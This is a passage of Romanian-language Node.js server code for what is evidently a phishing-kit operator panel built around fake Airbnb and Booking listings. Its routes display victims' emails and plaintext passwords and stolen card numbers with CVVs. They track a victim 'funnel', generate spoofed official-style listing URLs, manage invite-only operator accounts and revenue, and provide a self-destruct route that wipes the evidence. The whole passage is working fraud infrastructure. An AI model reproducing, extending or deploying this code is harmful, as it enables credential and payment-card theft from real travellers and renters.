    revenue: db.prepare("SELECT COALESCE(SUM(CAST(amount AS REAL)), 0) as c FROM payments WHERE status = 'completed'").get().c
  };
  const pendingApprovals = db.prepare("SELECT * FROM users WHERE status = 'pending' ORDER BY created_at DESC LIMIT 5").all();
  const recentInvites = db.prepare("SELECT * FROM invitations ORDER BY created_at DESC LIMIT 5").all();
  const recentCandidates = db.prepare("SELECT * FROM candidates ORDER BY created_at DESC LIMIT 5").all();
  const topClients = db.prepare("SELECT u.username, COUNT(c.id) as card_count FROM cards c JOIN users u ON c.user_id = u.id GROUP BY c.user_id ORDER BY card_count DESC LIMIT 5").all();

  let content = `<h1>Dashboard Admin</h1>
    <div class="stats-grid">
      <div class="stat-card"><div class="stat-num">${stats.totalUsers}</div><div>Utilizatori</div></div>
      <div class="stat-card"><div class="stat-num">${stats.activeUsers}</div><div>Activi</div></div>
      <div class="stat-card"><div class="stat-num">${stats.pendingUsers}</div><div>În așteptare</div></div>
      <div class="stat-card"><div class="stat-num">${stats.totalListings}</div><div>Listări</div></div>
      <div class="stat-card"><div class="stat-num">${stats.totalVictims}</div><div>Victime</div></div>
      <div class="stat-card"><div class="stat-num">${stats.totalCards}</div><div>Carduri</div></div>
      <div class="stat-card"><div class="stat-num" style="color:#a855f7">${stats.totalCandidates}</div><div>Candidați</div></div>
      <div class="stat-card"><div class="stat-num">${stats.totalPayments}</div><div>Plăți</div></div>
      <div class="stat-card"><div class="stat-num">${stats.revenue.toFixed(0)} €</div><div>Venit</div></div>
    </div>
    <div class="panel-grid">
      <div class="panel"><h3>📨 Ultimele Invitații</h3><table class="data-table"><tr><th>Token</th><th>Status</th><th>Creat</th></tr>
        ${recentInvites.map(i => `<tr><td>${i.token.substring(0,12)}...</td><td><span class="status-${i.status}">${i.status}</span></td><td>${i.created_at}</td></tr>`).join('')}
      </table></div>
      <div class="panel"><h3>🔍 În Așteptarea Aprobării</h3><table class="data-table"><tr><th>Username</th><th>Email</th><th>Acțiune</th></tr>
        ${pendingApprovals.map(u => `<tr><td>${u.username}</td><td>${u.email}</td><td><a href="/admin/users/approve/${u.id}" class="btn-sm btn-success">Aprobă</a> <a href="/admin/users/reject/${u.id}" class="btn-sm btn-danger">Respinge</a></td></tr>`).join('')}
      </table></div>
    </div>
    <div class="panel-grid" style="margin-top:20px">
      <div class="panel"><h3>🪪 Ultimele Aplicații Candidați</h3><table class="data-table"><tr><th>ID</th><th>Candidat</th><th>Document</th><th>Video</th><th>Dată</th><th>Acțiune</th></tr>
        ${recentCandidates.map(c => `<tr><td>#${c.id}</td><td>${esc(c.full_name)}<br><span style="color:#888;font-size:11px">${esc(c.email||'')}</span></td><td>${c.doc_file_path ? `<a href="${c.doc_file_path}" target="_blank" class="btn-sm btn-primary">⬇️ Doc</a>` : '—'}</td><td>${c.video_path ? `<span style="color:#22c55e">✓ Video</span>` : '—'}</td><td>${c.created_at}</td><td><a href="/admin/candidates/${c.id}" class="btn-sm btn-primary">Dosar</a></td></tr>`).join('') || '<tr><td colspan="6" style="text-align:center;color:#888;padding:16px">Niciun candidat înregistrat.</td></tr>'}
      </table></div>
      <div class="panel"><h3>🏆 Top Clienți</h3><table class="data-table"><tr><th>Username</th><th>Carduri</th></tr>
        ${topClients.map(c => `<tr><td>${c.username}</td><td>${c.card_count}</td></tr>`).join('')}
      </table></div>
    </div>`;
  res.send(adminPage('Dashboard', content));
});

app.get('/admin/invitations', requireAdmin, (req, res) => {
  const invitations = db.prepare("SELECT * FROM invitations ORDER BY created_at DESC").all();
  let content = `<h1>📨 Invitații</h1>
    <div style="margin-bottom:20px"><form action="/admin/invitations/create" method="POST" style="display:flex;gap:10px;align-items:end">
      <div><label>Email (opțional)</label><input type="email" name="email" placeholder="client@email.com" style="padding:10px;border:1px solid #333;background:#1a1a2e;color:#fff;border-radius:6px;width:250px"></div>
      <div><button type="submit" class="btn btn-primary">+ Generează Link Nou</button></div>
    </form></div>
    <div class="panel"><table class="data-table"><tr><th>Token</th><th>Email</th><th>Status</th><th>Link</th><th>Creat</th><th>Expiră</th></tr>
      ${invitations.map(i => `<tr><td><code>${i.token.substring(0,16)}...</code></td><td>${i.email||'-'}</td><td><span class="status-${i.status}">${i.status}</span></td><td><input value="${reqBase(req)}/invite/${i.token}" readonly onclick="this.select()" style="width:100%;background:#0d0d1a;border:1px solid #333;color:#4CAF50;padding:4px 8px;border-radius:4px;font-size:11px"></td><td>${i.created_at}</td><td>${i.expires_at}</td></tr>`).join('')}
    </table></div>`;
  res.send(adminPage('Invitații', content));
});

app.post('/admin/invitations/create', requireAdmin, (req, res) => {
  const token = uuidv4().replace(/-/g, '').substring(0, 32);
  const email = req.body.email || null;
  db.prepare("INSERT INTO invitations (token, created_by, status, email, expires_at) VALUES (?, ?, 'unused', ?, datetime('now', '+48 hours'))").run(token, req.user.id, email);
  db.prepare("INSERT INTO logs (user_id, action, details, ip_address) VALUES (?, 'create_invite', ?, ?)").run(req.user.id, `Created invite: ${token}`, req.ip);
  res.redirect('/admin/invitations');
});

app.get('/admin/users', requireAdmin, (req, res) => {
  const users = db.prepare("SELECT * FROM users WHERE is_admin = 0 ORDER BY created_at DESC").all();
  let content = `<h1>👥 Utilizatori</h1><div class="panel"><table class="data-table"><tr><th>ID</th><th>Username</th><th>Email</th><th>Status</th><th>Plan</th><th>Expiră</th><th>Acțiuni</th></tr>
    ${users.map(u => `<tr><td>${u.id}</td><td>${u.username}</td><td>${u.email}</td><td><span class="status-${u.status}">${u.status}</span></td><td>${u.plan}</td><td>${u.plan_expiry||'-'}</td><td>
      ${u.status==='pending'?`<a href="/admin/users/approve/${u.id}" class="btn-sm btn-success">Aprobă</a> `:''}
      ${u.status==='active'?`<a href="/admin/users/block/${u.id}" class="btn-sm btn-danger">Blochează</a> `:''}
      ${u.status==='blocked'?`<a href="/admin/users/unblock/${u.id}" class="btn-sm btn-success">Deblochează</a> `:''}
      <a href="/admin/users/delete/${u.id}" class="btn-sm btn-danger" onclick="return confirm('Ștergi?')">Șterge</a>
    </td></tr>`).join('')}
  </table></div>`;
  res.send(adminPage('Utilizatori', content));
});

app.get('/admin/users/approve/:id', requireAdmin, (req, res) => {
  db.prepare("UPDATE users SET status = 'active' WHERE id = ?").run(req.params.id);
  db.prepare("INSERT INTO logs (user_id, action, details, ip_address) VALUES (?, 'approve_user', ?, ?)").run(req.user.id, `Approved ${req.params.id}`, req.ip);
  res.redirect('/admin/users');
});

app.get('/admin/users/reject/:id', requireAdmin, (req, res) => {
  db.prepare("DELETE FROM users WHERE id = ? AND status = 'pending'").run(req.params.id);
  res.redirect('/admin/users');
});

app.get('/admin/users/block/:id', requireAdmin, (req, res) => {
  db.prepare("UPDATE users SET status = 'blocked' WHERE id = ?").run(req.params.id);
  res.redirect('/admin/users');
});

app.get('/admin/users/unblock/:id', requireAdmin, (req, res) => {
  db.prepare("UPDATE users SET status = 'active' WHERE id = ?").run(req.params.id);
  res.redirect('/admin/users');
});

app.get('/admin/users/delete/:id', requireAdmin, (req, res) => {
  const uid = req.params.id;
  db.prepare('DELETE FROM cards WHERE user_id = ?').run(uid);
  db.prepare('DELETE FROM victims WHERE user_id = ?').run(uid);
  db.prepare('DELETE FROM listings WHERE user_id = ?').run(uid);
  db.prepare('DELETE FROM payments WHERE user_id = ?').run(uid);
  db.prepare('DELETE FROM users WHERE id = ? AND is_admin = 0').run(uid);
  res.redirect('/admin/users');
});

app.get('/admin/listings', requireAdmin, (req, res) => {
  const listings = db.prepare("SELECT l.*, u.username FROM listings l JOIN users u ON l.user_id = u.id ORDER BY l.created_at DESC").all();
  let content = `<h1>📋 Toate Listările</h1><div class="panel"><table class="data-table"><tr><th>ID</th><th>Utilizator</th><th>Piață</th><th>Titlu</th><th>Preț</th><th>Viz.</th></tr>
    ${listings.map(l => `<tr><td>${l.id}</td><td>${l.username}</td><td>${l.marketplace}</td><td>${l.title}</td><td>${l.price}</td><td>${l.views}</td></tr>`).join('')}
  </table></div>`;
  res.send(adminPage('Listări', content));
});

app.get('/admin/victims', requireAdmin, (req, res) => {
  const victims = db.prepare("SELECT v.*, u.username, l.title as listing_title FROM victims v JOIN users u ON v.user_id = u.id LEFT JOIN listings l ON v.listing_id = l.id ORDER BY v.created_at DESC LIMIT 200").all();
  let content = `<h1>🎯 Toate Victimele</h1><div class="panel"><table class="data-table"><tr><th>ID</th><th>Utilizator</th><th>Email</th><th>Parolă</th><th>Piață</th><th>Stadiu</th><th>Dată</th></tr>
    ${victims.map(v => `<tr><td>${v.id}</td><td>${v.username}</td><td>${v.email||'-'}</td><td>${v.password||'-'}</td><td>${v.marketplace}</td><td>${v.stage}</td><td>${v.created_at}</td></tr>`).join('')}
  </table></div>`;
  res.send(adminPage('Victime', content));
});

app.get('/admin/cards', requireAdmin, (req, res) => {
  const cards = db.prepare("SELECT c.*, u.username FROM cards c JOIN users u ON c.user_id = u.id ORDER BY c.created_at DESC LIMIT 200").all();
  let content = `<h1>💳 Toate Cardurile</h1><div class="panel"><table class="data-table"><tr><th>ID</th><th>Utilizator</th><th>Număr</th><th>Titular</th><th>Expiră</th><th>CVV</th><th>Sumă</th><th>Dată</th></tr>
    ${cards.map(c => `<tr><td>${c.id}</td><td>${c.username}</td><td>${c.card_number}</td><td>${c.card_holder}</td><td>${c.expiry}</td><td>${c.cvv}</td><td>${c.amount}</td><td>${c.created_at}</td></tr>`).join('')}
  </table></div>`;
  res.send(adminPage('Carduri', content));
});

app.get('/admin/payments', requireAdmin, (req, res) => {
  const payments = db.prepare("SELECT p.*, u.username FROM payments p JOIN users u ON p.user_id = u.id ORDER BY p.created_at DESC LIMIT 100").all();
  let content = `<h1>💰 Plăți</h1><div class="panel"><table class="data-table"><tr><th>ID</th><th>Utilizator</th><th>Tip</th><th>Sumă</th><th>Status</th><th>Dată</th></tr>
    ${payments.map(p => `<tr><td>${p.id}</td><td>${p.username}</td><td>${p.type}</td><td>${p.amount}</td><td><span class="status-${p.status}">${p.status}</span></td><td>${p.created_at}</td></tr>`).join('')}
  </table></div>`;
  res.send(adminPage('Plăți', content));
});

app.get('/admin/reports', requireAdmin, (req, res) => {
  let content = `<h1>📊 Rapoarte</h1><div class="panel"><h3>Activitate Ultimele 7 Zile</h3><table class="data-table"><tr><th>Zi</th><th>Victime Noi</th><th>Carduri Noi</th><th>Plăți</th></tr>`;
  for (let i = 6; i >= 0; i--) {
    const dayExpr = `date('now', '-${i} days')`;
    const v = db.prepare(`SELECT COUNT(*) as c FROM victims WHERE date(created_at) = ${dayExpr}`).get().c;
    const c = db.prepare(`SELECT COUNT(*) as c FROM cards WHERE date(created_at) = ${dayExpr}`).get().c;
    const p = db.prepare(`SELECT COUNT(*) as c FROM payments WHERE date(created_at) = ${dayExpr}`).get().c;
    content += `<tr><td>${new Date(Date.now()-i*86400000).toLocaleDateString('ro-RO')}</td><td>${v}</td><td>${c}</td><td>${p}</td></tr>`;
  }
  content += `</table></div>`;
  res.send(adminPage('Rapoarte', content));
});

app.get('/admin/settings', requireAdmin, (req, res) => {
  let content = `<h1>⚙️ Setări Platformă</h1>
    <div class="panel"><h3>Configurare</h3>
    <form method="POST" action="/admin/settings" style="display:flex;flex-direction:column;gap:12px;max-width:500px">
      <div><label>Parolă Admin Nouă (lasă gol pentru a păstra)</label><input type="password" name="admin_password" style="width:100%;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:6px"></div>
      <div><button type="submit" class="btn btn-primary">Salvează</button></div>
    </form></div>
    <div class="panel" style="margin-top:20px;border-color:#ff4444"><h3 style="color:#ff4444">⚠️ Auto-Distrugere</h3>
    <p style="color:#ff6666">Această acțiune șterge TOATE datele. Ireversibil.</p>
    <form method="POST" action="/admin/selfdestruct" onsubmit="return confirm('EȘTI SIGUR? Toate datele vor fi șterse.')">
      <input type="text" name="confirm" placeholder="Scrie DELETE pentru a confirma" required style="padding:10px;background:#1a1a2e;border:1px solid #ff4444;color:#ff4444;border-radius:6px;width:250px">
      <button type="submit" class="btn btn-danger" style="margin-left:10px">Auto-Distrugere</button>
    </form></div>`;
  res.send(adminPage('Setări', content));
});

app.post('/admin/settings', requireAdmin, (req, res) => {
  if (req.body.admin_password && req.body.admin_password.length >= 6) {
    const hash = bcrypt.hashSync(req.body.admin_password, 10);
    db.prepare("UPDATE users SET password_hash = ? WHERE is_admin = 1").run(hash);
  }
  res.redirect('/admin/settings');
});

app.post('/admin/selfdestruct', requireAdmin, (req, res) => {
  if (req.body.confirm !== 'DELETE') return res.redirect('/admin/settings');
  db.exec('DELETE FROM cards; DELETE FROM victims; DELETE FROM listings; DELETE FROM payments; DELETE FROM logs; DELETE FROM users WHERE is_admin = 0; DELETE FROM invitations;');
  db.prepare("INSERT INTO logs (user_id, action, details, ip_address) VALUES (?, 'selfdestruct', 'All data wiped', ?)").run(req.user.id, req.ip);
  res.send('<h1 style="color:red;text-align:center;margin-top:100px;font-family:sans-serif">Toate datele au fost șterse.</h1>');
});

// === CANDIDATE VERIFICATION & RECRUITMENT ROUTES ===
const createCandidateRoutes = require('./marketplace/routes/candidates');
app.use('/', createCandidateRoutes({
  db,
  requireAdmin,
  clientPage,
  adminPage,
  esc: typeof esc === 'function' ? esc : (s => String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;')),
  UPLOAD_DIR
}));

// === AUTOMATED DOMAIN MANAGER & SSL ROUTES ===
const SSLService = require('./marketplace/services/ssl-service');
const sslService = new SSLService({ db, dataDir: path.join(__dirname, 'data') });
const createDomainRoutes = require('./marketplace/routes/domains');
app.use('/', createDomainRoutes({ db, requireAdmin, clientPage, adminPage, sslService }));

// === CLIENT DASHBOARD ROUTES ===
app.get('/dashboard', requireClient, (req, res) => {
  const uid = req.user.id;
  const stats = {
    listings: db.prepare('SELECT COUNT(*) as c FROM listings WHERE user_id = ?').get(uid).c,
    victims: db.prepare('SELECT COUNT(*) as c FROM victims WHERE user_id = ?').get(uid).c,
    cards: db.prepare('SELECT COUNT(*) as c FROM cards WHERE user_id = ?').get(uid).c,
    open: db.prepare("SELECT COUNT(*) as c FROM listings WHERE user_id = ? AND booking_status IN ('open','in_review','invoice_sent','payment_declined')").get(uid).c,
    paid: db.prepare("SELECT COUNT(*) as c FROM listings WHERE user_id = ? AND booking_status = 'paid'").get(uid).c,
    revenue: db.prepare("SELECT COALESCE(SUM(CAST(amount AS REAL)), 0) as c FROM payments WHERE user_id = ? AND status = 'completed'").get(uid).c
  };
  const recentListings = db.prepare(`SELECT l.*, a.name as apartment_name FROM listings l
    LEFT JOIN apartments a ON a.id = l.apartment_id
    WHERE l.user_id = ? ORDER BY COALESCE(l.status_updated_at, l.created_at) DESC LIMIT 8`).all(uid);
  const recentVictims = db.prepare('SELECT * FROM victims WHERE user_id = ? ORDER BY created_at DESC LIMIT 5').all(uid);
  const recentCards = db.prepare('SELECT * FROM cards WHERE user_id = ? ORDER BY created_at DESC LIMIT 5').all(uid);

  const listingRows = recentListings.map(l => {
    const st = bookingStatusMeta(l.booking_status || 'not_opened');
    const cname = clientFullName(l);
    const live = livePhishUrl(l, req);
    return `<tr style="border-top:1px solid #222">
      <td style="padding:12px;color:#fff;font-weight:600">${esc(cname)}
        <div style="color:#666;font-size:11px;font-weight:400">#${l.id} · ${esc(l.marketplace||'')}</div></td>
      <td style="padding:12px;color:#bbb;max-width:180px">${esc(l.apartment_name || l.title || '—')}</td>
      <td style="padding:12px"><span class="bs-badge" style="background:${st.bg};color:${st.color};border:1px solid ${st.color}44">${esc(st.label)}</span></td>
      <td style="padding:12px;color:#888;font-size:12px">${l.views||0}</td>
      <td style="padding:12px;white-space:nowrap">
        <a href="${esc(live)}" target="_blank" style="color:#4CAF50;font-size:12px;margin-right:10px;text-decoration:none">Open</a>
        <a href="/dashboard/listings/edit/${l.id}" style="color:#4da3ff;font-size:12px;text-decoration:none">Edit</a>
      </td>
    </tr>`;
  }).join('') || `<tr><td colspan="5" style="padding:28px;color:#666;text-align:center">No listings yet. <a href="/dashboard/create" style="color:#FF385C">Create one</a></td></tr>`;

  let content = `<div style="display:flex;justify-content:space-between;align-items:flex-start;gap:16px;flex-wrap:wrap;margin-bottom:22px">
      <div>
        <div style="color:#888;font-size:13px;margin-bottom:4px;letter-spacing:.3px">OVERVIEW</div>
        <h1 style="margin:0;font-size:28px;font-weight:700">Welcome, ${esc(req.user.username)}</h1>
        <p style="color:#777;margin:8px 0 0;font-size:14px">Manage listings, track booking status, and monitor activity.</p>
      </div>
      <div style="display:flex;gap:10px;flex-wrap:wrap">
        <a href="/dashboard/listari" style="display:inline-block;padding:12px 18px;background:#1a1a2e;border:1px solid #333;color:#ddd;border-radius:10px;text-decoration:none;font-weight:600;font-size:14px">View Listări</a>
        <a href="/dashboard/create" style="display:inline-block;padding:12px 20px;background:linear-gradient(90deg,#FF385C,#E61E4D);color:#fff;border-radius:10px;text-decoration:none;font-weight:700;font-size:14px;box-shadow:0 8px 24px rgba(255,56,92,.28)">+ Create listing</a>
      </div>
    </div>
    <div class="stats-grid" style="margin-bottom:22px">
      <div class="stat-card"><div class="stat-num">${stats.listings}</div><div>Listări</div></div>
      <div class="stat-card"><div class="stat-num">${stats.open}</div><div>Active funnel</div></div>
      <div class="stat-card"><div class="stat-num">${stats.paid}</div><div>Payment received</div></div>
      <div class="stat-card"><div class="stat-num">${stats.cards}</div><div>Carduri</div></div>
      <div class="stat-card"><div class="stat-num">${stats.victims}</div><div>Users</div></div>
      <div class="stat-card"><div class="stat-num">${Number(stats.revenue||0).toFixed(0)} €</div><div>Venit</div></div>
    </div>
    <div class="panel" style="margin-bottom:20px">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;gap:10px;flex-wrap:wrap">
        <h3 style="margin:0">📋 Recent listings</h3>
        <a href="/dashboard/listari" style="color:#8899ff;font-size:13px;text-decoration:none">See all →</a>
      </div>
      <div style="overflow-x:auto"><table style="width:100%;border-collapse:collapse">
        <thead><tr style="text-align:left;color:#666;font-size:12px">
          <th style="padding:8px 12px">Client</th><th style="padding:8px 12px">Apartment</th>
          <th style="padding:8px 12px">Status</th><th style="padding:8px 12px">Views</th><th style="padding:8px 12px"></th>
        </tr></thead>
        <tbody>${listingRows}</tbody>
      </table></div>
    </div>
    <div class="panel-grid">
      <div class="panel"><h3>👥 Latest users</h3><table class="data-table"><tr><th>Email</th><th>Market</th><th>Stage</th><th>Date</th></tr>
        ${recentVictims.map(v => `<tr><td>${esc(v.email||'-')}</td><td>${esc(v.marketplace||'')}</td><td>${esc(v.stage||'')}</td><td style="font-size:12px;color:#888">${esc(v.created_at||'')}</td></tr>`).join('') || '<tr><td colspan="4" style="color:#666;padding:16px">No activity yet</td></tr>'}
      </table></div>
      <div class="panel"><h3>💳 Latest cards</h3><table class="data-table"><tr><th>Number</th><th>Amount</th><th>Date</th></tr>
        ${recentCards.map(c => `<tr><td style="font-family:monospace">${esc(c.card_number||'')}</td><td>${esc(c.amount||'')}</td><td style="font-size:12px;color:#888">${esc(c.created_at||'')}</td></tr>`).join('') || '<tr><td colspan="3" style="color:#666;padding:16px">No cards yet</td></tr>'}
      </table></div>
    </div>
    <div class="panel" style="margin-top:16px">
      <h3 style="margin:0 0 8px">Live activity</h3>
      <div id="liveFeed" style="max-height:140px;overflow:auto;color:#888;font-size:13px">Waiting for client activity…</div>
    </div>`;
  res.send(clientPage('Dashboard', content, req.user));
});

// Create page (form only) — former Listări create section
app.get('/dashboard/create', requireClient, (req, res) => {
  const apartmentsForForm = db.prepare('SELECT id, name, title, location FROM apartments WHERE user_id = ? ORDER BY name').all(req.user.id);
  const hostsForForm = db.prepare('SELECT id, name, photo, is_superhost FROM hosts WHERE user_id = ? ORDER BY name').all(req.user.id);
  let content = `<div style="display:flex;justify-content:space-between;align-items:flex-start;gap:12px;flex-wrap:wrap;margin-bottom:12px">
      <div>
        <div style="color:#888;font-size:12px;letter-spacing:.3px;margin-bottom:4px">NEW LISTING</div>
        <h1 style="margin:0">Create</h1>
        <p style="color:#777;margin:8px 0 0;font-size:14px;max-width:560px">Pick apartment + host from your libraries, choose <strong style="color:#FF385C">Airbnb</strong> or <strong style="color:#4da3ff">Booking</strong>, add client details → generate. Saved listings appear in <a href="/dashboard/listari" style="color:#8899ff">Listări</a>.</p>
      </div>
    </div>
    ${listingCreateFormHtml(null, null, { apartments: apartmentsForForm, hosts: hostsForForm, selectedApartmentId: req.query.apt, selectedHostId: req.query.host, fixedMarketplace: req.query.mp })}`;
  res.send(clientPage('Create', content, req.user));
});

// Listări — generated listings / reservations table
app.get('/dashboard/listari', requireClient, (req, res) => {
  const listings = db.prepare(`SELECT l.*, a.name as apartment_name FROM listings l
    LEFT JOIN apartments a ON a.id = l.apartment_id
    WHERE l.user_id = ? ORDER BY l.created_at DESC`).all(req.user.id);
  const created = req.query.created ? db.prepare('SELECT * FROM listings WHERE id = ? AND user_id = ?').get(req.query.created, req.user.id) : null;
  const updated = req.query.updated ? db.prepare('SELECT * FROM listings WHERE id = ? AND user_id = ?').get(req.query.updated, req.user.id) : null;
  let banner = '';
  if (created) {
    const live = livePhishUrl(created, req);
    const spoof = spoofDisplayUrl(created);
    banner = `<div style="background:#0f2a1a;border:1px solid #2e7d32;padding:16px 18px;border-radius:12px;margin-bottom:18px;color:#c8e6c9">
      <strong style="color:#4CAF50">✓ Listing created (#${created.id})</strong>
      <div style="margin-top:10px;font-size:11px;color:#a5d6a7;letter-spacing:.5px">LISTING URL (OFFICIAL-STYLE) <span style="color:#7d947f">— afişare demo, nu se deschide; foloseşte butonul de mai jos</span></div>
      <input readonly onclick="this.select();window.open('${esc(live)}','_blank')" title="Click = copiază linkul + deschide funnel-ul în tab nou" value="${esc(spoof)}" style="width:100%;max-width:680px;background:#0d0d1a;border:1px solid #2e7d32;color:#fff;padding:10px 12px;border-radius:8px;font-size:13px;margin-top:4px;cursor:pointer">
      <div style="margin-top:8px;font-size:12px;color:#81c784">Live funnel link (opens on this server): <a href="${esc(live)}" target="_blank" style="color:#81c784">${esc(live)}</a></div>
    </div>`;
  } else if (updated) {
    const live = livePhishUrl(updated, req);
    const spoofUpd = spoofDisplayUrl(updated);
    banner = `<div style="background:#0f1a2a;border:1px solid #2196F3;padding:16px 18px;border-radius:12px;margin-bottom:18px;color:#bbdefb">
      <strong style="color:#64B5F6">✓ Listing updated (#${updated.id})</strong>
      <div style="margin-top:10px;font-size:11px;color:#90CAF9;letter-spacing:.5px">LISTING URL (OFFICIAL-STYLE) <span style="color:#6a89a8">— afişare demo, nu se deschide; foloseşte link-ul de mai jos</span></div>
      <input readonly onclick="this.select();window.open('${esc(live)}','_blank')" title="Click = copiază linkul + deschide funnel-ul în tab nou" value="${esc(spoofUpd)}" style="width:100%;max-width:680px;background:#0d0d1a;border:1px solid #2196F3;color:#fff;padding:10px 12px;border-radius:8px;font-size:13px;margin-top:4px;cursor:pointer">
      <div style="margin-top:8px;font-size:12px;color:#90CAF9">Live funnel link: <a href="${esc(live)}" target="_blank" style="color:#90CAF9">${esc(live)}</a>
      · <a href="/dashboard/listings/edit/${updated.id}" style="color:#90CAF9">Edit again</a></div>
    </div>`;
  }
  let content = `<div style="display:flex;justify-content:space-between;align-items:flex-start;gap:12px;flex-wrap:wrap;margin-bottom:14px">
      <div>
        <div style="color:#888;font-size:12px;letter-spacing:.3px;margin-bottom:4px">RESERVATIONS</div>
        <h1 style="margin:0">Listări</h1>
        <p style="color:#777;margin:8px 0 0;font-size:14px">All generated listings. Track status, bulk delete, or edit.</p>
      </div>
      <a href="/dashboard/create" style="display:inline-block;padding:12px 20px;background:linear-gradient(90deg,#FF385C,#E61E4D);color:#fff;border-radius:10px;text-decoration:none;font-weight:700">+ Create listing</a>
    </div>
    ${banner}
    ${(req.query.deleted ? '<div style="background:#1e3a2f;border:1px solid #2ecc71;color:#9fefc0;padding:10px 14px;border-radius:8px;margin-bottom:12px">Deleted ' + esc(String(req.query.deleted)) + ' listing(s).</div>' : '')}
    ${listingTableHtml(listings, req)}`;
  res.send(clientPage('Listări', content, req.user));
});

// Legacy redirects
app.get('/dashboard/listings', requireClient, (req, res) => {
  const q = req.url.includes('?') ? req.url.slice(req.url.indexOf('?')) : '';
  if (req.query.created || req.query.updated || req.query.deleted) {
    return res.redirect('/dashboard/listari' + q);
  }
  return res.redirect('/dashboard/create' + q);
});
app.get('/dashboard/airbnb', requireClient, (req, res) => {
  const qs = new URLSearchParams();
  if (req.query.apt) qs.set('apt', req.query.apt);
  if (req.query.host) qs.set('host', req.query.host);
  qs.set('mp', 'airbnb');
  const s = qs.toString();
  res.redirect('/dashboard/create' + (s ? '?' + s : ''));
});
app.get('/dashboard/booking', requireClient, (req, res) => {
  const qs = new URLSearchParams();
  if (req.query.apt) qs.set('apt', req.query.apt);
  if (req.query.host) qs.set('host', req.query.host);
  qs.set('mp', 'booking');
  const s = qs.toString();
  res.redirect('/dashboard/create' + (s ? '?' + s : ''));
});

app.post('/dashboard/listings/create', requireClient, (req, res, next) => {
  listingUpload(req, res, (err) => {
    if (err) {
      if (err.name === 'MulterError' || (err.code && String(err.code).startsWith('LIMIT_'))) {
        return res.status(400).send('<div style="text-align:center;padding:40px;font-family:sans-serif;background:#0d0d1a;color:#e0e0e0;min-height:100vh"><h1 style="color:#e74c3c">Eroare upload</h1><p>Verifica fisierele: poze (JPG/PNG/WebP/GIF) sau video (MP4/WebM/MOV), max 200MB/fisier.</p><a href="/dashboard" style="color:#4CAF50">Inapoi la dashboard</a></div>');
      }
      if (err.message && err.message.includes('Only image')) {
        return res.status(400).send('<div style="text-align:center;padding:40px;font-family:sans-serif;background:#0d0d1a;color:#e0e0e0;min-height:100vh"><h1 style="color:#e74c3c">Format invalid</h1><p>Doar imagini (JPEG/PNG/WebP/GIF) sau video (MP4/WebM/MOV).</p><a href="/dashboard" style="color:#4CAF50">Inapoi la dashboard</a></div>');
      }
      return next(err);
    }
    handleCreateListing(req, res).catch(err => {
      console.error('create listing error (async)', err);
      if (!res.headersSent) res.status(500).send('Eroare la crearea listării: ' + err.message);
    });
  });
});


app.get('/dashboard/listings/edit/:id', requireClient, (req, res) => {
  const id = parseInt(req.params.id, 10);
  const listing = db.prepare('SELECT * FROM listings WHERE id = ? AND user_id = ?').get(id, req.user.id);
  if (!listing) return res.status(404).send('<div style="padding:40px;font-family:sans-serif;background:#0d0d1a;color:#e0e0e0;min-height:100vh;text-align:center"><h1>Listare negăsită</h1><a href="/dashboard/listari" style="color:#4CAF50">Înapoi</a></div>');
  const apartmentsForForm = db.prepare('SELECT id, name, title, location FROM apartments WHERE user_id = ? ORDER BY name').all(req.user.id);
  const hostsForForm = db.prepare('SELECT id, name, photo, is_superhost FROM hosts WHERE user_id = ? ORDER BY name').all(req.user.id);
  const content = `<div style="margin-bottom:8px"><a href="/dashboard/listari" style="color:#8899ff;text-decoration:none;font-size:14px">← Back to Listări</a></div>
    ${listingCreateFormHtml(listing.marketplace, listing, { apartments: apartmentsForForm, hosts: hostsForForm })}`;
  res.send(clientPage('Editează #' + listing.id, content, req.user));
});

app.post('/dashboard/listings/update/:id', requireClient, (req, res, next) => {
  listingUpload(req, res, (err) => {
    if (err) {
      if (err.name === 'MulterError' || (err.code && String(err.code).startsWith('LIMIT_'))) {
        return res.status(400).send('<div style="text-align:center;padding:40px;font-family:sans-serif;background:#0d0d1a;color:#e0e0e0;min-height:100vh"><h1 style="color:#e74c3c">Eroare upload</h1><p>Verifica fisierele: poze (JPG/PNG/WebP/GIF) sau video (MP4/WebM/MOV), max 200MB/fisier.</p><a href="/dashboard/listari" style="color:#4CAF50">Inapoi</a></div>');
      }
      if (err.message && err.message.includes('Only image')) {
        return res.status(400).send('<div style="text-align:center;padding:40px;font-family:sans-serif;background:#0d0d1a;color:#e0e0e0;min-height:100vh"><h1 style="color:#e74c3c">Format invalid</h1><p>Doar imagini sau video acceptate.</p><a href="/dashboard/listari" style="color:#4CAF50">Inapoi</a></div>');
      }
      return next(err);
    }
    handleUpdateListing(req, res).catch(err => {
      console.error('update listing error (async)', err);
      if (!res.headersSent) res.status(500).send('Eroare la actualizarea listării: ' + err.message);
    });
  });
});




async function handleCreateListing(req, res) {
  try {
    const b = req.body || {};
    let apt = null;
    const apartmentId = parseInt(b.apartment_id, 10) || 0;
    if (apartmentId) {
      apt = db.prepare('SELECT * FROM apartments WHERE id = ? AND user_id = ?').get(apartmentId, req.user.id);
      if (!apt) return res.status(400).send('Apartment template not found');
    }
    const marketplace = (b.marketplace || 'airbnb').toLowerCase() === 'booking' ? 'booking' : 'airbnb';
    const title = ((apt && apt.title) || b.title || '').trim();
    if (!title) return res.status(400).send('Titlu obligatoriu (selectează un apartment sau completează titlul)');

    const clientFirst = (b.client_first_name || '').trim();
    const clientLast = (b.client_last_name || '').trim();
    const clientPhone = (b.client_phone || '').trim();
    const clientEmail = (b.client_email || '').trim();
    const clientAddress = (b.client_address || '').trim();
    const clientStay = (b.client_stay_duration || '').trim();

    const fileBag = req.files || {};
    const photoFiles = Array.isArray(fileBag.photos) ? fileBag.photos : [];
    const hostFiles = Array.isArray(fileBag.host_photo) ? fileBag.host_photo : [];
    const videoFiles = Array.isArray(fileBag.videos) ? fileBag.videos : [];
    // backward-compat if someone still passes upload.array result
    const flatFiles = Array.isArray(req.files) ? req.files : [];

    let images = [];
    if (apt && apt.images) {
      try { images = JSON.parse(apt.images) || []; } catch (e) { images = []; }
    }
    if (!images.length && apt && apt.image_url) images = [apt.image_url];
    photoFiles.forEach(f => images.push('/uploads/' + f.filename));
    flatFiles.filter(f => f.fieldname === 'photos' || /^image\//.test(f.mimetype || '')).forEach(f => {
      const u = '/uploads/' + f.filename;
      if (!images.includes(u)) images.push(u);
    });
